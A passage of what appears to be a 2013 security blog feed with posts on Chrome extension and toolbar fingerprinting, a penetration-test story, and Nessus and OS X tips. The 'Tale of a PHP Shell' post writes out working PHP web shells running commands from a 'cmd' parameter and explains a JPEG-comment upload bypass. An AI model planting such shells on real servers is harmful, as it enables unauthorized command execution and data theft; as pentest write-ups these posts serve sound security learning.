&lt;li&gt;2009 - &lt;a href=&quot;http://www.blackhat.com/presentations/bh-dc-09/Jagdale/BlackHat-DC-09-Jagdale-Blinded-by-Flash.pdf&quot;&gt;Blinded by Flash: Widespread Security Risks Flash Developers Don’t See&lt;/a&gt; (by Prajakta Jagdale)&lt;/li&gt;
&lt;li&gt;2010 - &lt;a href=&quot;http://www.blackhat.com/presentations/bh-dc-10/Bailey_Mike/BlackHat-DC-2010-Bailey-Neat-New-Ridiculous-flash-hacks-slides.pdf&quot;&gt;Neat, New, and Ridiculous Flash Hack&lt;/a&gt; (by Mike Bailey)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Cross_site_flashing_%28OWASP-DV-004%29&quot;&gt;OWASP - Testing for Cross Site Flashing&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/03/flash-testing-for-dummies&quot;&gt;Flash Testing for Dummies&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on March 31, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Detecting Chrome Extensions in 2013]]></title>
  <link>/2013/03/detecting-chrome-extensions-in-2013</link>
  <id>/2013/03/detecting-chrome-extensions-in-2013</id>
  <published>2013-03-23T00:00:00-07:00</published>
  <updated>2013-03-23T00:00:00-07:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;Detecting Google Chrome extension has always been a trivial job, as highlighted by &lt;a href=&quot;http://www.skeletonscribe.net/2011/07/sparse-bruteforce-addon-scanner.html&quot;&gt;previous&lt;/a&gt; &lt;a href=&quot;http://blog.kotowicz.net/2012/02/intro-to-chrome-addons-hacking.html&quot;&gt;researches&lt;/a&gt;. It was all a matter of finding the extension ID and to try loading its &lt;em&gt;manifest.json&lt;/em&gt; file, which is always located in the extension&amp;#39;s root directory:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;chrome-extension://abcdefghijklmnopqrstuvwxyz0123456789/manifest.json
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;However, in the latest version of Chrome, some attempts at loading the manifest were greeted with an unpleasent message:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Denying load of chrome-extension://abcdefghijklmnopqrstuvwxyz0123456789/manifest.json. Resources must be listed in the web_accessible_resources manifest key in order to be loaded by pages outside the extension.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;What the heck is the &lt;em&gt;web&lt;em&gt;accessible&lt;/em&gt;resources manifest key&lt;/em&gt;? A quick look at the manifest file highlights the following array:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;quot;web_accessible_resources&amp;quot;: [ &amp;quot;logo.png&amp;quot;, &amp;quot;menu.html&amp;quot;, &amp;quot;style.css&amp;quot; ]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Since Chrome 18, Google deprecated manifest version 1 and its support will be decreasing, making the old version unavailable in September 2013. Among the differences between &lt;a href=&quot;https://developer.chrome.com/dev/extensions/manifestVersion.html#manifest-v1-changes&quot;&gt;version 1 and 2&lt;/a&gt;, Google introduced the &lt;a href=&quot;https://developer.chrome.com/dev/extensions/manifest.html#web_accessible_resources&quot;&gt;web&lt;em&gt;accessible&lt;/em&gt;resources&lt;/a&gt; array, which determines the local resources that can be loaded by external sources.&lt;/p&gt;

&lt;p&gt;So, if the manifest file doesn&amp;#39;t include it (ie. it&amp;#39;s still version 1), any resource in the extension&amp;#39;s directory can be loaded by external pages. Otherwise, if the file uses already the newer version (shown as &lt;code&gt;&amp;quot;manifest_version&amp;quot;: 2&lt;/code&gt;) and includes a &lt;em&gt;web&lt;em&gt;accessible&lt;/em&gt;resources&lt;/em&gt; array, only the listed resources can be loaded.&lt;/p&gt;

&lt;p&gt;A generic JavaScript approach, which works for text files and pictures alike, builds a &lt;code&gt;script&lt;/code&gt; element and sets its source to the desired file. The following code is just an example:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;scriptSrc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;script&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;            
&lt;span class=&quot;nx&quot;&gt;scriptSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;onload&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;[ONLOAD CODE]&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;scriptSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;src&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;chrome-extension://&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;scriptSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;While the previous code works for every type of file, an approach specific to picture files can be used if needed. The following code creates an &lt;code&gt;img&lt;/code&gt; element:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot; data-lang=&quot;javascript&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;imgSrc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;createElement&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;img&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;imgSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;border&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;imgSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;width&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;imgSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;height&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;0&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;imgSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;onload&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;[ONLOAD CODE]&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;imgSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setAttribute&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;src&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;chrome-extension://&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;resource&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;appendChild&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;imgSrc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;While probably requiring updates to existing detection code, &lt;em&gt;web&lt;em&gt;accessible&lt;/em&gt;resources&lt;/em&gt; won&amp;#39;t stop specific loading attempts, making extension detection still possible.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/03/detecting-chrome-extensions-in-2013&quot;&gt;Detecting Chrome Extensions in 2013&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on March 23, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[A Tale of a PHP Shell]]></title>
  <link>/2013/03/a-tale-of-a-php-shell</link>
  <id>/2013/03/a-tale-of-a-php-shell</id>
  <published>2013-03-13T00:00:00-07:00</published>
  <updated>2013-03-13T00:00:00-07:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;During a penetration test where I had only a single day to get the most out of a web application, a photo upload feature caught my attention. By the time I got to the upload page, I already discovered that all the photos were uploaded to a specific directory for each authenticated user:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://example.com/attachments/[USERID]/
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;I knew where my uploaded files will be put, now it was time to get a shell up and working! I started with a very basic shell, which I usually employ as a starting point:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;First of all, I tried uploading a .php file directly, just to test my daily luck. Without much surprise, the application only accepted JPEG files.&lt;/p&gt;

&lt;p&gt;Next, I tried adding the .jpg extension to my file, relying on the usual tricks as &lt;code&gt;shell.php.jpg&lt;/code&gt;, &lt;code&gt;shell.jpg&lt;/code&gt;, &lt;code&gt;shell.php%00.jpg&lt;/code&gt; etc. None of them went through.&lt;/p&gt;

&lt;p&gt;The only remaining solution seemed to insert the shell code into the JPEG comment, as the application apperared to accept only proper image files. It worked!&lt;/p&gt;

&lt;p&gt;Jumping right into the newly uploaded shell, I quickly discover that the .jpg file wasn&amp;#39;t being executed by the server, leaving me with a useless commented picture.&lt;/p&gt;

&lt;p&gt;To test the security mechanisms further, I tried renaming the JPEG into .php and this time the upload completed successfully. The application was only checking for the file to be a proper JPEG, regardless of the extension!&lt;/p&gt;

&lt;p&gt;Getting back to my shell, I am greeted by an error message stating that &lt;code&gt;system()&lt;/code&gt; is disabled and couldn&amp;#39;t be used to execute commands. My chances were getting thin as I figured most of the functions must have been disabled. In order to check which functions I could still use, I uploaded the following code:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ini_get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;disable_functions&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Despite my basic knowledge of the PHP language, I immediately noticed that the returned list was not including the &lt;code&gt;exec()&lt;/code&gt; function. The updated shell now looked like:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;To my dismay, while not returning any error messages, the shell was returning only one-line responses (e.g. &lt;code&gt;whoami&lt;/code&gt; worked, &lt;code&gt;ls&lt;/code&gt; didn&amp;#39;t). Utterly annoyed, I went back to the &lt;code&gt;exec()&lt;/code&gt; guide and noticed that I got it all wrong! To properly address the output issue, the shell evolved into:&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;implode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&quot;x&quot;&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Once more, I inserted the code into a JPG comment and renamed it to shell.php. This time the uploaded shell was finally working properly! The shell could be used via the &lt;code&gt;cmd&lt;/code&gt; parameter in order to execute commands directly onto the server.&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://example.com/attachments/12345/shell.php?cmd=whoami
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;At this point, I was able to browse and operate on the whole web root, but &lt;em&gt;mod_security&lt;/em&gt; was forbidding me more interesting actions, like executing &lt;code&gt;cat /etc/password&lt;/code&gt;. Not completely satisfied with the result, I checked the available applications and noticed that &lt;code&gt;curl&lt;/code&gt; was available...&lt;/p&gt;

&lt;p&gt;Time was running out and I decided to try out &lt;a href=&quot;https://github.com/epinna/Weevely&quot;&gt;Weevely&lt;/a&gt;, an (amazing) interactive shell that can be controlled from the terminal. Using Dropbox and &lt;code&gt;curl&lt;/code&gt; I was able to directly download Weevely on the remote server and the new shell was able to read /etc/passwd and return other interesting PHP configuration information, like the list of available functions.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/03/a-tale-of-a-php-shell&quot;&gt;A Tale of a PHP Shell&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on March 13, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Removing RimAlbumArtDaemon]]></title>
  <link>/2013/03/removing-rimalbumartdaemon</link>
  <id>/2013/03/removing-rimalbumartdaemon</id>
  <published>2013-03-04T00:00:00-08:00</published>
  <updated>2013-03-04T00:00:00-08:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;If you are on OS X and happen to use BlackBerry Desktop Software, you might have met the infamous &lt;em&gt;RimAlbumArtDaemon&lt;/em&gt; process. This extremely unhelpful process is well-known to hog your memory for no apparent reason and to keep iTunes from quitting.&lt;/p&gt;

&lt;p&gt;After struggling for days, I finally found a &lt;a href=&quot;http://supportforums.blackberry.com/t5/Desktop-Software-for-Mac/blackberry-daemon-process-help/m-p/1403387#M7835&quot;&gt;solution&lt;/a&gt;, which I will report here for my own reference (hopefully helping others). &lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo rm /Library/Application&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;Support/BlackBerry/RimAlbumArtDaemon&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;I didn&amp;#39;t found any reason against deleting the file completely, but if you&amp;#39;d like to play it safe you could just rename it.&lt;/p&gt;

&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /Library/Application&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;Support/BlackBerry/
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sudo mv RimAlbumArtDaemon RimAlbumArtDaemon.old&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Note that the process will come back every time the BlackBerry software gets updated.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/03/removing-rimalbumartdaemon&quot;&gt;Removing RimAlbumArtDaemon&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on March 04, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Detecting Browser Toolbars]]></title>
  <link>/2013/02/detecting-browser-toolbars-in-2013</link>
  <id>/2013/02/detecting-browser-toolbars-in-2013</id>
  <published>2013-02-14T00:00:00-08:00</published>
  <updated>2013-02-14T00:00:00-08:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;In January 2013 I began my involvement with the &lt;a href=&quot;http://beefproject.org&quot;&gt;Browser Exploitation Framework&lt;/a&gt; (BeEF) and the first assignement was the development of a toolbar detection module. Since a preliminary web search highlighted the lack of widespread information about the matter, I got right into hands-on testing.&lt;/p&gt;

&lt;p&gt;The module focused on the most common toolbars on the market: &lt;em&gt;Alexa&lt;/em&gt;, &lt;em&gt;Answers.com&lt;/em&gt;, &lt;em&gt;Ask&lt;/em&gt;, &lt;em&gt;Bing&lt;/em&gt;, &lt;em&gt;Google&lt;/em&gt;, &lt;em&gt;Stumble Upon&lt;/em&gt; and &lt;em&gt;Yahoo!&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;A first analysis uncovered that all the toolbars, with the only exception of the ones from Ask and Yahoo!, added a string to the browser User-Agent, thus making the detection trivial (i.e. &lt;code&gt;navigator.userAgent&lt;/code&gt;):&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Alexa Toolbar&lt;/code&gt; (Alexa)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;AskTbS-PV/5.15.12.33066&lt;/code&gt; (Ask)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;BRI/2&lt;/code&gt; (Bing)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;GTB7.4&lt;/code&gt; (Google)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;SU 3.96&lt;/code&gt; (Stumble Upon)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;A basic regular expression could then be used to detect which toolbars are installed and could be expanded later on to detect even more.&lt;/p&gt;

&lt;p&gt;The User-Agent didn&amp;#39;t provide any data to easily detect the Answers and Yahoo toolbars, so I moved onto DOM analysis, also to improve the overall reliability of the script. Unfortunately, only the Alexa toolbar seemed to add anything to the DOM, while there was no visible content added by the other software. The code that Alexa&amp;#39;s toolbar added to the document head was the following:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;script id=&amp;quot;AlexaCustomScriptId&amp;quot;&amp;gt;&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;To my dismay, there was still no sign of the Answers and Yahoo toolbars anywhere! In the end, I pushed the module in its hybrid state, checking both DOM and User-Agent, and without being able to detect the two missing toolbars.&lt;/p&gt;

  &lt;p&gt;&lt;a href=&quot;/2013/02/detecting-browser-toolbars-in-2013&quot;&gt;Detecting Browser Toolbars&lt;/a&gt; was originally published by  at &lt;a href=&quot;&quot;&gt;BoringSec&lt;/a&gt; on February 14, 2013.&lt;/p&gt;</content>
</entry>


<entry>
  <title type="html"><![CDATA[Introducing Simple Nessus]]></title>
  <link>/2013/02/simple-nessus</link>
  <id>/2013/02/simple-nessus</id>
  <published>2013-02-07T00:00:00-08:00</published>
  <updated>2013-02-07T00:00:00-08:00</updated>
  <author>
    <name></name>
    <uri></uri>
    <email></email>
  </author>
  <content type="html">&lt;p&gt;&lt;strong&gt;Simple Nessus&lt;/strong&gt; is a Perl script developed to simplify the output of the &lt;a href=&quot;http://www.tenable.com/products/nessus&quot;&gt;Tenable Nessus&lt;/a&gt; scanner by keeping only relevant information. It works like this:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;perl simple-nessus.pl {NESSUS-FILE} {VERSION} [SEVERITY] [OUTPUT] [OTHER-OPTIONS]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The version option can either be &lt;code&gt;-v1&lt;/code&gt; or &lt;code&gt;-v2&lt;/code&gt; depending on how the report was exported from Nessus.&lt;/p&gt;

&lt;p&gt;You can additionally set the minimum vulnerability severity as following (default &lt;code&gt;-s L&lt;/code&gt;):&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;-s L:   low, medium, high and critical
-s M:   medium, high and critical
-s H:   high and critical
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Furthermore, Simple Nessus provides several output options to meet your needs.&lt;br&gt;
The default &lt;code&gt;-o O&lt;/code&gt; prints to STDOUT and, just like text output (&lt;code&gt;-o T&lt;/code&gt;), it looks like:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;[*] 192.168.229.2
Apache HTTP Server Byte Range DoS
Apache Banner Linux Distribution Disclosure
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The CSV output (&lt;code&gt;-o C&lt;/code&gt;) looks like:&lt;/p&gt;
&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;host;vulnerability
192.168.229.2;Apache HTTP Server Byte Range DoS
